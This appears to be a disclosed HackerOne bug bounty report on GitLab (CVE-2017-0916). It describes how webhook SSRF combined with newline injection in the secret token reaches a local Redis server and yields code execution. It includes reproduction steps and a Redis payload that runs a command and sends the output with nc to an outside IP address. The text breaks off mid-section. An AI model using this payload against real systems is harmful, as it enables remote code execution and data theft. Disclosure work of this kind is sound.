# [H] Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook

## Summary
Severity: High (CVSS 8.5)
Program: GitLab
Weakness: Server-Side Request Forgery (SSRF)
Reporter: jobert
State: resolved
Disclosed: 2018-04-27T02:21:14.315Z
CVE: CVE-2017-0916
Source: https://hackerone.com/reports/299473

## Details
The secret token field of a webhook is vulnerable to a new line injection, allowing an attacker to inject non-HTTP commands in a TCP stream. When a GitLab instance is configured with an external Redis instance, e.g. on `127.0.0.1:6379`, it may result in arbitrary code execution on a Sidekiq worker by abusing a blind Server-Side Request Forgery (SSRF) vulnerability in the webhook integration and the new line injection. One of my other reports regarding these SSRFs, #131190, is still open and has been for more than a year. However, because this is a service I haven't reported the SSRF in and chaining it with the new line injection increases the severity of the vulnerability, I decided to report it. To reproduce, start by signing in to the GitLab instance and creating a new project.

To reproduce the RCE, a Redis server has to be running on port 6379. Follow the GitLab documentation to set up the Redis server and reconfigure GitLab by running `gitlab-ctl reconfigure`. When that's done, continue to go to the Integrations section of the created project. Intercept your network traffic before continuing. Now, enter `http://127.0.0.1:6379/` as the webhook endpoint and `A` as the secret token. When the request is submitted, a request similar to the one below is submitted:

**Request**
```
POST /root/test/hooks HTTP/1.1
Host: gitlab-instance
...
----------1282688597
Content-Disposition: form-data; name="hook[url]"

http://127.0.0.1:6379/
----------1282688597
Content-Disposition: form-data; name="hook[token]"

A
...
```

In the request above I changed the body encoding to make it easier to inject the payload. Now, replace the `hook[token]` field with the payload below.

**Payload**
```
A
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
```

Then, when the integration persisted, click the `Test` button next to the newly created integration. Here's what happens next: a `POST` request will be submitted to `127.0.0.1`, port `6379` (Redis). Redis is pretty easy on errors, so it'll simply ignore the first couple lines of the HTTP request. Then, a couple headers further down, it is including the `X-GitLab-Token` that is vulnerable to the new line injection. Here's the entire request that is posted:

**Injected request**
```
POST / HTTP/1.1
Content-Type: application/json
X-Gitlab-Event: Push Hook
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/299473_
